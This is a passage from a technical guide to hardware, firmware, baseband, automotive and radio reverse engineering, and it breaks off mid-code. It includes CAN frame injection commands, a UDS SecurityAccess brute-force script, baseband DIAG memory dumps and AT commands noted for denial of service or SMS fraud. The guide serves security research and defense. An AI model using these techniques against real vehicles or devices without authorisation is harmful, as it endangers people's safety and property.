# Step 5: Repack the squashfs with MATCHING parameters
# This example uses xz compression with 128K block size (common in OpenWrt)
mksquashfs squashfs-root new_rootfs.squashfs -comp xz -b 131072 -no-xattrs \
    -noappend -all-root

# Step 6: Reassemble the firmware image
# The original firmware layout: [header][kernel][squashfs][padding]
# Calculate the offset where the squashfs starts (from binwalk output)
# and splice the new squashfs into the original image
dd if=firmware.bin of=header.bin bs=1 count=$SQUASHFS_OFFSET
cat header.bin new_rootfs.squashfs > modified_firmware.bin

# Step 7: Fix checksums if the firmware uses a header checksum
# Many vendor firmwares have a CRC32 or MD5 in the header
# Vendor-specific tools or custom scripts are needed to recalculate
```

The critical detail is matching compression parameters exactly. If the original firmware uses `lzma` compression with 256K blocks and you repack with `xz` or a different block size, the device's bootloader or kernel may fail to mount the filesystem. The `unsquashfs -s` output shows all parameters that must be reproduced.

**UBIFS and JFFS2 modification** follow similar principles but with additional complexity because these filesystems are designed for raw NAND flash with its specific geometry (page size, block size, OOB layout). For UBIFS, the workflow uses the `ubi-utils` package:

```bash
# Extract UBI image from the NAND dump
ubireader_extract_images nand_dump.bin -o ubi_extracted/

# Extract the filesystem from the UBI image
ubireader_extract_files ubi_extracted/img-*.ubi -o rootfs/

# Modify the extracted filesystem as needed
# ...

# Repack: must match original UBI parameters exactly
# Check the original parameters from the UBI headers
ubireader_display_info nand_dump.bin

# Create the new UBIFS image (parameters must match the original)
mkfs.ubifs -r rootfs/ -o new_rootfs.ubifs \
    -m 2048 -e 126976 -c 2048 \
    -x lzo     # Compression type: lzo, zlib, or none

# Create the final UBI image with the correct volume configuration
ubinize -o new_ubi.img -m 2048 -p 128KiB ubinize.cfg
```

The `ubinize.cfg` configuration file must specify the volume type, name, and image path. Getting the minimum I/O unit size (`-m`), LEB size (`-e`), and physical erase block size (`-p`) wrong produces an image that will not mount on the target device.

### 3.4 Firmware emulation

Emulating firmware allows dynamic analysis without physical hardware — a critical capability when the device is expensive, fragile, or not available. Three approaches cover different use cases.

**QEMU user-mode** (single binary emulation): emulates a single Linux binary with system call translation. Useful for analyzing specific firmware binaries (web servers, CGI handlers, management daemons) extracted from the root filesystem:

```bash
# Install QEMU static binaries for cross-architecture emulation
sudo apt install qemu-user-static

# Emulate an ARM binary extracted from firmware
# chroot into the extracted rootfs so library paths resolve correctly
sudo chroot squashfs-root /usr/bin/qemu-arm-static /usr/bin/httpd

# With strace-like output for analyzing system calls
qemu-arm-static -strace ./extracted_binary

# With GDB server for debugging
qemu-arm-static -g 1234 ./extracted_binary
# Connect from GDB: target remote :1234
```

**QEMU system-mode** (full system emulation): emulates an entire system including the CPU, memory, and peripherals. Useful for booting complete firmware images, but requires matching the hardware platform (QEMU supports several ARM machine types: `virt`, `versatilepb`, `raspi2`, etc.):

```bash
# Boot an ARM Linux kernel with a rootfs extracted from firmware
qemu-system-arm -M versatilepb -kernel zImage \
    -dtb versatile-pb.dtb \
    -drive file=rootfs.ext2,if=scsi,format=raw \
    -append "root=/dev/sda console=ttyAMA0" \
    -nographic -serial mon:stdio

# MIPS system emulation (common for routers)
qemu-system-mipsel -M malta -kernel vmlinux \
    -drive file=rootfs.ext2,format=raw \
    -append "root=/dev/sda console=ttyS0" \
    -nographic -net nic -net user,hostfwd=tcp::8080-:80
```

**Firmadyne** (automated firmware emulation): a research platform that automates the process of extracting, emulating, and testing IoT firmware. Firmadyne handles the common case of Linux-based firmware on MIPS, ARM, and other architectures:

```bash
# Clone and set up Firmadyne
git clone https://github.com/firmadyne/firmadyne.git
cd firmadyne
./setup.sh

# Extract the firmware image
./sources/extractor/extractor.py -b <brand> -sql 127.0.0.1 \
    -np -nk firmware.bin images

# Identify the architecture
./scripts/getArch.sh ./images/<image_id>.tar.gz

# Create a QEMU image and configure networking
./scripts/makeImage.sh <image_id>
./scripts/inferNetwork.sh <image_id>

# Run the emulated firmware
./scratch/<image_id>/run.sh
```

Once the firmware is running in emulation, the device's web interface, CLI, and network services are accessible for vulnerability testing (command injection, authentication bypass, buffer overflows in CGI handlers) without needing the physical device. Port forwarding in the QEMU or Firmadyne configuration maps the emulated device's services to the host: the web interface becomes accessible at `http://localhost:8080`, SSH at port 2222, and so on, allowing standard web application scanners and fuzzers to operate against the emulated target.

A practical limitation of firmware emulation is peripheral emulation fidelity. Many firmware binaries interact with hardware peripherals (GPIO controllers, hardware watchdog timers, custom SoC registers) that QEMU does not emulate. This causes crashes or hangs during boot. Workarounds include: patching the binary to NOP-out peripheral initialization code (identified by finding MMIO register accesses to addresses that are not mapped in QEMU's memory map), providing stub implementations of the hardware abstraction layer, or using Avatar2 (a framework that proxies hardware accesses from QEMU to a physical device connected via JTAG, combining the debugging flexibility of emulation with real hardware peripherals).

**FirmWalker** is a complementary static analysis script that walks an extracted firmware filesystem and flags security-relevant findings: hardcoded passwords in configuration files, private keys, URLs, IP addresses, email addresses, and common vulnerable patterns. Run it against the extracted rootfs:

```bash
git clone https://github.com/craigz28/firmwalker.git
./firmwalker.sh /path/to/extracted/squashfs-root/
```

### 3.5 Firmware decryption methodology

Many vendors encrypt their firmware update images to prevent analysis and modification. Decrypting these images is often the first — and hardest — step in firmware RE.

The common encryption schemes range from trivial to robust: XOR with a static key (found in cheap IoT devices — identifiable by repeating patterns in the entropy plot), AES-CBC or AES-ECB with a hardcoded key (the key must be stored somewhere the device can access it — typically in the bootloader), and RSA or hybrid schemes where the firmware is encrypted with a symmetric key that is itself encrypted with a public key (the private decryption key is stored in the device's secure element or OTP fuses).

The key extraction methodology depends on where the key lives. If the bootloader performs decryption, reversing the bootloader binary (U-Boot or a custom first-stage loader) reveals the decryption routine and the key material. Look for references to AES S-box constants (`0x63, 0x7c, 0x77, 0x7b` — the first four bytes of the AES forward S-box) or crypto library function names in the strings. If the key is in OTP fuses, JTAG access (if available) may allow reading the fuse registers. If the device supports UART and the bootloader decrypts firmware during boot, the decrypted image may be visible in RAM and dumpable via U-Boot's `md` command or JTAG memory reads.

A common pattern in consumer-grade encrypted firmware is key derivation from device-specific data. The firmware update file is encrypted with AES, and the key is derived from a combination of the device model string, a serial number prefix, and a hardcoded salt — all of which are obtainable from the device's label or its DIAG interface. Reversing the update application (often a Windows `.exe` or a shell script on the device itself) reveals the key derivation algorithm. For devices where the key is truly stored in a secure element and never exposed to software, firmware decryption without hardware attacks may be impossible, and the analysis must rely on runtime techniques — dumping the firmware from RAM after the bootloader has decrypted it.

Another approach is differential firmware analysis: if both encrypted and decrypted versions of a firmware exist (e.g., an older firmware version was released unencrypted, or a debug build leaked), comparing the two reveals the encryption structure (block alignment, IV derivation, padding scheme), which constrains the key search space and validates candidate keys.

### 3.6 Firmware modification and real CVEs

**CVE-2019-19781** (Citrix ADC/NetScaler, CVSS 9.8): A directory-traversal vulnerability in the Citrix Application Delivery Controller that allowed unauthenticated remote code execution. The vulnerable component was a Perl CGI script accessible via the management interface. From a firmware RE perspective, this vulnerability was discoverable by extracting the Citrix ADC firmware image (a FreeBSD-based appliance), mounting the filesystem, and auditing the web-accessible CGI scripts for path-traversal patterns. The fix involved sanitizing the path parameter in the affected endpoint. This CVE became a mass-exploitation vector with widespread in-the-wild exploitation within days of disclosure.

**CVE-2023-20198** (Cisco IOS XE, CVSS 10.0): A critical vulnerability in the web UI of Cisco IOS XE that allowed an unauthenticated remote attacker to create a privileged (Level 15) user account on affected devices. When chained with CVE-2023-20273, it allowed root-level command execution and implant installation. The implant was a Lua-based backdoor that persisted in the web server's runtime. Firmware analysis revealed that the vulnerability was in the HTTP server's handling of specific URL paths that reached internal provisioning APIs without authentication checks. This case demonstrates how network-appliance firmware analysis directly parallels IoT firmware RE — the same extraction, filesystem mounting, and binary analysis techniques apply to enterprise-grade equipment.

**Router command injection**: A pervasive vulnerability class in consumer router firmware. CVE-2017-17215 (Huawei HG532, exploited by the Satori botnet) was a command-injection vulnerability in the UPnP SOAP interface where user-supplied input was passed to a `system()` call without sanitization. RE methodology: extract the firmware, locate the web server or CGI binaries, search for calls to `system()`, `popen()`, `execv()`, or backtick operators, and trace back to any user-controlled input (HTTP parameters, SOAP fields, SNMP community strings).

---

## 4. Baseband and modem RE

Cellular basebands (Qualcomm, MediaTek, Samsung Shannon, Intel/Apple) are independent processors running their own RTOS that handle all radio protocol processing (LTE/5G PHY, MAC, RLC, RRC, NAS layers). They are a rich attack surface because they process complex, untrusted input (radio frames from cell towers) and run with high privilege (direct hardware access, often with DMA to the application processor's memory).

**Qualcomm DIAG protocol**: a proprietary diagnostic interface (typically over USB or shared memory) that provides access to modem internals: log messages, NV (non-volatile) configuration items, subsystem commands, and memory read/write. Tools: QXDM (Qualcomm's official tool), `qcsuper`/`scat` (open-source DIAG parsers).

**AT command interface**: the legacy modem command set (Hayes AT commands). Extended AT commands (vendor-specific) can control radio parameters, read IMSI/ICCID, send raw SMS, and access modem memory. Accessible via serial port or USB.

**QMI (Qualcomm Messaging Interface)** and **MBIM (Mobile Broadband Interface Model)**: modern control interfaces between the application processor and the modem. QMI is Qualcomm-specific; MBIM is a USB standard. Both use message-based protocols with TLV-encoded fields.

RE approach: capture DIAG/QMI/MBIM traffic (USB sniffing with Wireshark's USBPcap), reverse the baseband binary (typically a large ARM binary loaded from the modem firmware partition), identify the message handlers, and trace the protocol state machines.

### 4.1 Samsung Shannon baseband RE

Samsung's Shannon baseband (used in Exynos-based Galaxy devices) is one of the most researched proprietary basebands, thanks to extensive work by Google Project Zero and independent researchers. The Shannon firmware is a monolithic ARM binary (typically 30–80 MB) running a real-time operating system on a dedicated Cortex-R or Cortex-A core.

**Extracting the Shannon binary**: On Samsung devices, the baseband firmware is in the `modem.bin` partition, accessible from a rooted device or extractable from the full firmware package (Odin-format `.tar.md5` files available from Samsung firmware repositories). The `modem.bin` file contains the entire baseband image, which includes the RTOS kernel, protocol stack, and task handlers.

**Loading in Ghidra/IDA**: The Shannon binary is loaded at a known base address (which can be determined from the modem's memory map, often documented in the device tree or found by searching for self-referencing pointers in the binary). The binary contains an RTOS task table — a structure listing all tasks (threads) with their entry points, stack sizes, and priorities. Locating this table (by searching for patterns of function pointers followed by stack-size constants) is the first step in mapping the codebase.

The protocol stack is organized by layer. The NAS (Non-Access Stratum) handlers are the primary target for remote exploitation because NAS messages are processed before authentication in many attach procedures. The L3 message dispatcher parses the protocol discriminator and message type bytes from incoming messages and dispatches to type-specific handler functions. Each handler parses TLV (Type-Length-Value) or TV (Type-Value) information elements from the message body — and this parsing is where most vulnerabilities live.

The Shannon binary also contains extensive debug strings (in some firmware versions) that serve as function-name oracles. Searching for strings like `NAS_EMM_`, `MM_`, `CC_`, `SM_` prefixes identifies the protocol layer handlers. Cross-referencing these strings with their referencing functions rapidly maps the major subsystems. The IMS (IP Multimedia Subsystem) code handles SIP/SDP parsing for VoLTE calls — this is the component where CVE-2023-24033 was found, and it is a particularly rich attack surface because SIP messages can contain arbitrary-length string fields that stress the parser.

For Qualcomm basebands, a similar RE approach applies, but the binary structure differs. Qualcomm modems run a proprietary RTOS (historically REX, more recently QuRT) and the firmware is structured as a collection of ELF segments. The modem firmware is in the `modem.mdt` metadata file (which describes the segment layout) plus `modem.b00` through `modem.bNN` segment files. These can be reassembled into a loadable binary using `pil-splitter` tools. The task/thread table in QuRT is structured differently from Shannon's RTOS, but the same principle applies — locating the task table maps the codebase into manageable functional units.

### 4.2 Qualcomm DIAG exploitation

The Qualcomm DIAG protocol provides a powerful and often under-secured diagnostic interface. `qcsuper` is an open-source tool for interacting with the DIAG port:

```bash
# Install qcsuper
pip install qcsuper

# List available DIAG devices (typically /dev/diag or a USB serial port)
qcsuper --usb-modem auto --info

# Capture live 2G/3G/4G signaling to a PCAP file
qcsuper --usb-modem auto --pcap-dump capture.pcap

# Capture with specific layer filters
qcsuper --usb-modem auto --pcap-dump capture.pcap --layers 2g,3g,4g

# Memory dump via DIAG (if the modem firmware allows it — not all do)
qcsuper --usb-modem auto --memory-dump 0x00000000 0x10000
```

`scat` (Signaling Collection and Analysis Tool) parses DIAG log packets into human-readable protocol traces:

```bash
# Parse a captured DIAG log file
scat -t qc -d parsed_output.json raw_diag_capture.bin

# Live parsing from a serial port
scat -t qc -s /dev/ttyUSB0 -d output.json
```

The DIAG interface has been exploited in several ways: reading NV items that contain sensitive configuration (including SIM lock data, carrier provisioning, and calibration data), writing NV items to unlock carrier-locked devices, and in some firmware versions, using the memory read/write DIAG commands to achieve arbitrary code execution on the baseband processor.

### 4.3 AT command exploitation

The AT command interface, despite being a legacy protocol from the 1980s Hayes modem era, remains a potent attack surface on modern smartphones and modems. Research by Tian et al. (USENIX Security 2018, "ATtention Spanned") systematically discovered that many Android devices expose dangerous vendor-specific AT commands over the USB interface.

Common dangerous AT commands:

```
AT+CLAC          # List ALL available AT commands (reconnaissance)
AT+CFUN=0        # Turn off the radio (denial of service)
AT+CFUN=1,1      # Reboot the modem
AT+CGSN          # Read IMEI
AT+CIMI          # Read IMSI from SIM
AT+COPS?         # Current network operator
AT+CPWD          # Change SIM PIN
AT+CMGS          # Send SMS (can be abused for premium-rate fraud)
AT+CSIM           # Direct SIM APDU access
```

Vendor-specific commands are where the real danger lies. Samsung's `AT+DEVCONINFO` leaks device information. Qualcomm's `AT+QLINUXCMD` (on some modem firmware versions) executes Linux commands on the application processor. MediaTek modems have been found with AT commands that allow memory read/write operations on the baseband processor. These vendor-specific commands are discoverable by sending `AT+CLAC` (which lists all supported commands) and then systematically probing each unknown command.

### 4.4 OTA message fuzzing

Fuzzing the Over-The-Air (OTA) message interface of basebands is the state of the art for finding remotely exploitable vulnerabilities. The approach requires either a software-defined base station (using open-source implementations like srsRAN or OpenAirInterface to create a rogue cell tower) or a hardware-in-the-loop setup where fuzzing inputs are injected through the DIAG/QMI interface into the modem's protocol stack.

The fuzzing target is the NAS and RRC message parsers. These parsers handle ASN.1-encoded (for LTE/5G RRC) and bit-packed (for NAS) messages with complex nested structures. Mutation-based fuzzing mutates valid captured messages, while generation-based fuzzing creates messages from the ASN.1 grammar. The Samsung Shannon work by Project Zero used a combination of both approaches, identifying multiple memory-corruption vulnerabilities in the NAS message parsing code that were exploitable without user interaction.

### 4.5 Real baseband CVEs

**CVE-2023-24033** (Samsung Shannon, CVSS 9.8): One of a set of vulnerabilities discovered by Google Project Zero in Samsung's Shannon baseband, collectively called the "Exynos modem vulnerabilities." This specific CVE was an Internet-to-baseband remote code execution vulnerability in the SDP (Session Description Protocol) parsing code of the IMS (IP Multimedia Subsystem) module. The vulnerability allowed a remote attacker to execute arbitrary code on the baseband processor by sending a specially crafted SIP INVITE message, requiring no user interaction. The attack surface was the device's IMS registration for VoLTE/VoWiFi — any device with VoLTE enabled was reachable.

**CVE-2022-20210** (Qualcomm modem): A critical vulnerability in Qualcomm's modem firmware related to improper validation of protocol message fields. This CVE is representative of a broader class of Qualcomm baseband vulnerabilities where insufficient bounds checking on incoming radio-layer messages (NAS, RRC) leads to memory corruption on the modem processor. Because cellular protocol messages are processed before mutual authentication completes, many of these vulnerabilities are exploitable by a rogue base station without any pre-existing relationship with the target device.

**Qualcomm MSM interface vulnerabilities**: Check Point Research disclosed a vulnerability in Qualcomm's MSM (Mobile Station Modem) interface where the QMI communication channel between the application processor and the modem lacked sufficient validation of TLV field lengths. A malicious or compromised application processor could send crafted QMI messages that triggered memory corruption in the modem firmware. While this required local access (a compromised app on the phone), it demonstrated that the modem's trust boundary with the application processor was insufficient — the modem implicitly trusted the format of messages from the application processor, an assumption that fails when the AP is compromised.

---

## 5. Automotive RE

### 5.1 CAN bus

CAN (Controller Area Network) is the primary communication bus in vehicles. CAN frames are broadcast to all nodes on the bus. Each frame contains: an arbitration ID (11-bit standard or 29-bit extended), a DLC (Data Length Code, 0–8 bytes), and the data payload. There is no source addressing, no authentication, and no encryption in standard CAN.

**Sniffing**: connect a CAN interface (e.g., `socketcand` with a USB-to-CAN adapter like the PEAK PCAN-USB, CANtact, or Kvaser) to the OBD-II port (pins 6/14 for CAN High/Low). `candump` (from `can-utils`) captures all frames. `cansniffer` shows changing values in real time.

**Injection**: `cansend` sends arbitrary frames. An attacker on the CAN bus can send frames to any ECU: door lock/unlock, instrument cluster manipulation, engine control (on older vehicles without gateway ECUs), and steering/braking (on vehicles where safety-critical systems share the CAN bus with infotainment — increasingly rare due to gateway architectures).

### 5.2 can-utils complete command reference

The `can-utils` package (part of the Linux SocketCAN subsystem) is the standard toolkit for CAN bus interaction. Setting up the interface is the prerequisite:

```bash
# Set up a SocketCAN interface with a USB-to-CAN adapter (e.g., PEAK PCAN-USB)
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# For CAN FD (Flexible Data-Rate) capable interfaces
sudo ip link set can0 type can bitrate 500000 dbitrate 2000000 fd on
sudo ip link set up can0

# Virtual CAN interface for testing without hardware
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
```

The core tools:

```bash
# candump — capture all CAN frames with timestamps
candump can0                           # All frames, default format
candump -ta can0                       # With absolute timestamps
candump -L can0 > capture.log          # Log format (replayable)
candump can0,0x7DF:0x7FF               # Filter: only arbitration IDs 0x7DF-0x7FF
candump -n 1000 can0                   # Capture exactly 1000 frames

# cansend — send a single CAN frame
cansend can0 7DF#0201050000000000      # Send OBD-II PID request (RPM)
cansend can0 000#DEADBEEF              # Arbitrary frame injection
cansend can0 18DA00FA#0230010000000000 # Extended (29-bit) ID frame

# cansniffer — real-time differential view (highlights changing bytes)
cansniffer can0                        # Show all changing frames
cansniffer -c can0                     # Color mode for easier reading
cansniffer can0 -f 100-200             # Filter ID range

# canplayer — replay a captured log file
canplayer -I capture.log               # Replay at original timing
canplayer -I capture.log -g 0          # Replay as fast as possible
canplayer -I capture.log can0=vcan0    # Remap interface names

# cangen — generate random CAN traffic (for testing)
cangen can0 -g 10 -I 42A -L 8 -D i   # Generate frames on ID 0x42A, 8 bytes,
                                       # incrementing data, 10ms gap

# isotprecv / isotpsend — ISO-TP (ISO 15765-2) transport layer
# ISO-TP handles multi-frame messages (used by UDS, OBD-II extended)
isotprecv -l -s 7E0 -d 7E8 can0       # Listen for ISO-TP messages
                                       # TX ID 0x7E0, RX ID 0x7E8
isotpsend -s 7E0 -d 7E8 can0          # Send ISO-TP message (reads hex from stdin)
```

**SavvyCAN** provides a GUI-based approach to CAN bus analysis. It supports multiple CAN interfaces simultaneously, provides real-time frame display with filtering, includes a signal decoder (DBC file support for mapping raw bytes to physical values), and offers a graphing module for visualizing signal changes over time. For reverse engineering unknown CAN signals, the workflow is: capture traffic while performing a specific vehicle action (e.g., turning the steering wheel), use SavvyCAN's signal finder to identify which arbitration IDs and byte positions changed during the action, and map the raw byte values to physical units through calibration.

### 5.3 UDS and OBD-II

**UDS (Unified Diagnostic Services, ISO 14229)**: the standard diagnostic protocol for automotive ECUs. UDS runs over CAN (ISO-TP transport layer, ISO 15765). Key services: `DiagnosticSessionControl` (switch to programming or extended session), `ReadDataByIdentifier` (read ECU parameters), `WriteDataByIdentifier`, `RoutineControl` (execute routines — calibration, self-test), `RequestDownload`/`TransferData`/`RequestTransferExit` (flash new firmware to the ECU), `SecurityAccess` (unlock protected services via a challenge-response, often with weak algorithms).

**OBD-II**: the standardized on-board diagnostics port. OBD-II PIDs (Parameter IDs) provide access to engine data (RPM, speed, coolant temperature, fuel trim, emission data). OBD-II is read-only for standard PIDs but vendor-extended PIDs may allow writes.

### 5.4 UDS Security Access brute-forcing

The UDS `SecurityAccess` service (service ID `0x27`) is the gatekeeper for privileged diagnostic operations (firmware flashing, calibration data modification, DTC clearing on some ECUs). The protocol is a challenge-response: the tester sends `SecurityAccess` with sub-function `0x01` (requestSeed), the ECU returns a seed, the tester computes a key from the seed using a secret algorithm, and sends it back with sub-function `0x02` (sendKey). If the key is correct, the ECU unlocks the protected session.

The security algorithm is the weak point. Many ECUs use simple transformations: XOR with a static mask, byte rotation, addition of a constant, or a short lookup table. These can be brute-forced or reverse-engineered from the ECU firmware:

```python
#!/usr/bin/env python3
"""UDS SecurityAccess brute-force / algorithm extraction example."""
import can
import isotp

# Set up ISO-TP socket to the target ECU
bus = can.interface.Bus(channel='can0', bustype='socketcan')
tp_addr = isotp.Address(isotp.AddressingMode.Normal_11bits,
                        txid=0x7E0, rxid=0x7E8)
stack = isotp.CanStack(bus=bus, address=tp_addr)

# Step 1: Enter Extended Diagnostic Session
stack.send(bytes([0x10, 0x03]))  # DiagnosticSessionControl, extendedSession
response = stack.recv(timeout=2)

# Step 2: Request seed
stack.send(bytes([0x27, 0x01]))  # SecurityAccess, requestSeed
seed_response = stack.recv(timeout=2)
seed = seed_response[2:]  # Skip service ID and sub-function
print(f"Seed: {seed.hex()}")

# Step 3: Compute key (example: XOR each byte with 0xAA — a real but weak algorithm)
# In practice, reverse the key algorithm from the ECU firmware
key = bytes([b ^ 0xAA for b in seed])

# Step 4: Send key
stack.send(bytes([0x27, 0x02]) + key)
response = stack.recv(timeout=2)
if response[0] == 0x67:  # Positive response
    print("Security Access GRANTED")
else:
    print(f"Security Access DENIED: {response.hex()}")
```

### 5.5 ECU firmware extraction via UDS

Once Security Access is granted, the UDS `RequestUpload` (service `0x35`) and `TransferData` (service `0x36`) services can extract the ECU's firmware. The flow is: send `RequestUpload` with the memory address and size, the ECU responds with the maximum block length, then repeatedly call `TransferData` to read the data in blocks, and finally `RequestTransferExit` (`0x37`) to close the transfer. Not all ECUs support upload (many only support download/flashing), but those that do effectively expose their entire firmware through the diagnostic interface.

### 5.6 Real automotive CVEs

**Miller and Valasek Jeep Cherokee research (2015)**: The seminal automotive security research that demonstrated remote exploitation of a moving vehicle. Charlie Miller and Chris Valasek exploited a vulnerability in the Uconnect infotainment system (accessible via the Sprint cellular network) to gain code execution on the head unit. From there, they pivoted through the CAN bus — because the head unit had a direct CAN bus connection to the vehicle's internal network without adequate gateway isolation — to send CAN frames that controlled the steering, braking, and transmission. The research led to the recall of 1.4 million Chrysler vehicles and directly motivated the adoption of CAN bus gateway architectures in modern vehicles.

**Tesla Model S research (Keen Security Lab, 2016-2018)**: Multiple vulnerability chains were demonstrated against Tesla Model S vehicles. The 2016 research exploited a chain of vulnerabilities: a browser vulnerability in the infotainment system's WebKit engine, escalation through the Linux kernel on the infotainment system, and then CAN bus injection to control the brakes and other vehicle systems remotely. Tesla's over-the-air update capability allowed rapid patching. The 2017 follow-up research bypassed Tesla's mitigations by finding new vulnerabilities in the gateway ECU's firmware update mechanism. These findings are significant because Tesla's architecture (with a gateway ECU between the infotainment and safety-critical buses) was considered more secure than most OEMs — the researchers had to bypass the gateway rather than simply bridging bus segments.

### 5.7 Other automotive protocols

**FlexRay**: high-speed, deterministic bus for safety-critical systems (steering, braking). Time-Division Multiple Access (TDMA) scheduling. Harder to inject into than CAN (the attacker must synchronize with the TDMA schedule).

**LIN (Local Interconnect Network)**: low-speed, single-wire bus for simple actuators (mirrors, seat adjustment, rain sensors). Master-slave architecture.

**Automotive Ethernet (100BASE-T1, 1000BASE-T1)**: increasingly used for high-bandwidth communication (cameras, ADAS, infotainment). Standard Ethernet frames over automotive-grade physical layer. Bring all IP-based network security concerns (Domain 9) into the vehicle.

### 5.8 Automotive defenses

**SecOC (Secure Onboard Communication)**: Part of the AUTOSAR standard, SecOC adds message authentication (MAC — Message Authentication Code) to CAN and other automotive bus frames. Each authenticated frame includes a truncated CMAC (typically 24–64 bits, constrained by the 8-byte CAN payload limit) and a freshness counter to prevent replay attacks. The MAC key is provisioned per-vehicle during manufacturing. SecOC's primary limitation is the overhead: the MAC and freshness counter consume payload bytes in the already-constrained 8-byte CAN frame, reducing the space for actual signal data. CAN FD's 64-byte payload mitigates this constraint.

**CAN Intrusion Detection Systems (IDS)**: Anomaly-based detection monitors CAN bus traffic for deviations from the expected pattern — frames sent at unexpected intervals, frames with IDs not present in the vehicle's DBC specification, frames with values outside the defined range, and bus-off events (which may indicate a CAN bus denial-of-service attack). The CAN bus's real-time deterministic nature actually helps IDS: because each ECU transmits its frames on a predictable schedule, a foreign frame with a legitimate ID but sent at the wrong time in the cycle is detectable by timing analysis.

**Gateway ECU hardening**: Modern vehicles route CAN bus traffic through a central gateway ECU that enforces routing policies — only specific frames are forwarded between bus segments (e.g., the infotainment bus can read speed and RPM from the powertrain bus, but frames originating on the infotainment bus are never forwarded to the safety-critical steering/braking bus). The gateway is the single most important architectural security control in modern vehicles.

**Secure firmware update for ECUs**: The UNECE WP.29 regulation (effective for new vehicle types in the EU from July 2022 and for all new vehicles from July 2024) mandates that OEMs implement a Software Update Management System (SUMS) that ensures firmware updates are authenticated and integrity-verified before installation. This means ECU firmware updates must be digitally signed, the ECU must verify the signature before flashing, and the update process must be resistant to rollback attacks (flashing an older, vulnerable firmware version). Uptane (an automotive-specific extension of TUF — The Update Framework) is the reference architecture for secure OTA updates, providing protection against key compromise through threshold signatures and metadata expiration.

---

## 6. Expanded topics

### 6.1 FPGA bitstream RE

FPGA bitstreams (configuration files for Xilinx, Intel/Altera, Lattice FPGAs) are typically proprietary binary formats. RE of bitstreams: **Project X-Ray** (documents Xilinx 7-series bitstream format), **Project IceStorm** (documents Lattice iCE40 bitstream), and **Project Trellis** (Lattice ECP5). These projects enable bitstream-to-netlist conversion: recovering the logic design from the programming file. Security implication: FPGA-based hardware security modules (HSMs) and crypto accelerators can have their logic reverse-engineered if the bitstream is extractable.

Bitstream encryption: most FPGAs support AES-encrypted bitstreams, with the key stored in battery-backed SRAM or eFuses. If the key is compromised (side-channel attack on the FPGA's decryption engine, eFuse readout), the encrypted bitstream can be decrypted and analyzed.

**Project X-Ray bitstream analysis workflow**: The Project X-Ray database maps each bit position in the Xilinx 7-series bitstream to a specific configuration element (LUT content, routing mux setting, IOB configuration, BRAM initialization data). Using the `prjxray-db` database and the associated tools:

```bash
# Clone the Project X-Ray database for the target FPGA family
git clone https://github.com/f4pga/prjxray-db.git

# Convert a raw bitstream to a text-based FASM (FPGA Assembly) representation
# This maps each set bit to a named feature
xc7frames2bit --frm_file design.frm --output_file design.bit  # forward
bit2fasm --db-root prjxray-db/artix7 --part xc7a35tcpg236-1 \
    design.bit > design.fasm  # reverse

# The FASM file is human-readable — each line describes a configured feature:
# CLBLL_L_X12Y100.SLICEL_X0.ALUT.INIT[31:0] = 32'hDEADBEEF
# This shows the LUT initialization values, which encode the logic functions

# For Lattice iCE40, use Project IceStorm tools
iceunpack design.bin design.asc     # Unpack bitstream to ASCII representation
icebox_vlog design.asc > design.v   # Convert to Verilog netlist
```

The recovered netlist can be analyzed for cryptographic implementations (identifying AES, SHA, or RSA blocks), proprietary protocol logic, and security-sensitive state machines. For FPGA-based HSMs, this analysis reveals key management logic, access control mechanisms, and potential bypass paths.

### 6.2 PCB reverse engineering

Recovering the schematic from a physical PCB: photograph both sides (high-resolution), identify components (read part numbers, cross-reference datasheets), trace connections (visually or with a multimeter for continuity), and reconstruct the schematic. Multi-layer PCBs require X-ray imaging or destructive delamination to trace inner-layer connections. Tools: **KiCad** for schematic entry, **OpenBoardView** for annotating board photos.

**X-ray methodology**: Multi-layer PCBs (4+ layers are standard in modern electronics; 8–12 layers are common in complex devices) hide critical signal traces on inner layers that are invisible from surface inspection. X-ray imaging (using a micro-CT or a 2D X-ray system) reveals via positions, internal trace routing, and buried components. Professional PCB RE services use automated X-ray scanning combined with image-processing algorithms to reconstruct the complete layer stackup. For security researchers without access to professional X-ray equipment, lower-cost desktop X-ray systems (designed for SMT inspection) can reveal via locations and approximate trace routing on inner layers.

**Destructive delamination**: When X-ray is insufficient (for very dense boards or when exact trace widths matter), the PCB can be delaminated layer by layer. The process involves progressively grinding or etching away copper and dielectric layers, photographing each exposed layer at high resolution, and then digitally stacking the images to reconstruct the full board. This is irreversible — the PCB is destroyed — so it is a last-resort technique applied to one sample while keeping a second intact for testing.

**Automated trace extraction**: Research tools like those from Sandia National Laboratories and academic projects have demonstrated automated trace extraction from high-resolution PCB photographs. The pipeline is: capture the image, correct for lens distortion, segment the copper traces from the substrate, vectorize the traces, and output a netlist. While fully automated commercial solutions exist (e.g., from companies specializing in competitive analysis), open-source tooling in this space remains limited.

**Component identification and datasheet recovery**: The first practical step in PCB RE is reading part numbers from every IC package and cross-referencing against datasheets. Unmarked chips (where the manufacturer has laser-etched or sandblasted the markings off for IP protection) require additional techniques: decapping the chip and reading the die markings, measuring the pinout behavior with a multimeter and oscilloscope to identify the chip family (I2C devices at specific addresses, SPI flash with JEDEC ID responses, voltage regulators with known feedback networks), or identifying the chip by its package footprint and pin count against known component databases. The `Octopart` API and distributor cross-reference databases accelerate this process for marked components.

### 6.3 Radio/SDR RE

Software-Defined Radio (SDR) enables RE of proprietary radio protocols. Tools: RTL-SDR (cheap receiver), HackRF (transmit + receive), USRP (high-performance). **GNU Radio** provides the signal processing framework. Workflow: capture the radio signal, identify the modulation (AM, FM, FSK, GFSK, OFDM), demodulate to a bitstream, identify the framing and encoding (Manchester, NRZ, 4B/5B), and reverse the protocol from the bitstream.

Applications: key-fob cloning (fixed-code RF remotes are trivially cloneable; rolling-code systems like KeeLoq have known cryptographic weaknesses), IoT protocol RE (Zigbee, Z-Wave, LoRa — all analyzable with SDR), and pager/POCSAG interception.

**GNU Radio flowgraph examples**: GNU Radio uses a dataflow programming model where signal-processing blocks are connected into a flowgraph. For demodulating a simple FSK signal (common in tire pressure monitors, weather stations, and simple remote controls):

```python
#!/usr/bin/env python3
"""GNU Radio flowgraph for FSK demodulation from an RTL-SDR source."""
from gnuradio import gr, blocks, analog, digital, filter
from gnuradio import audio
import osmosdr

class fsk_demod(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self)

        # RTL-SDR source — tune to the target frequency
        self.source = osmosdr.source(args="rtl=0")
        self.source.set_sample_rate(2e6)        # 2 MSPS
